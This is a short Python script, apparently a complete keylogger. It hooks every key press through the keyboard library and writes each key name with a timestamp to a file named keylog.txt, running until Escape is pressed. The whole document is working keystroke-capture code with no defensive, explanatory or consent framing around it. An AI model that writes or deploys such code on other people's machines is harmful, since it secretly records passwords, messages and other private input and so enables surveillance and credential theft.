import keyboard
import logging

# Set up logging configuration
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s %(message)s')

# Function to log keystrokes
def log_keystroke(event):
    logging.info(event.name)

# Hook the keyboard event
keyboard.on_press(log_keystroke)

# Keep the script running
keyboard.wait('esc')
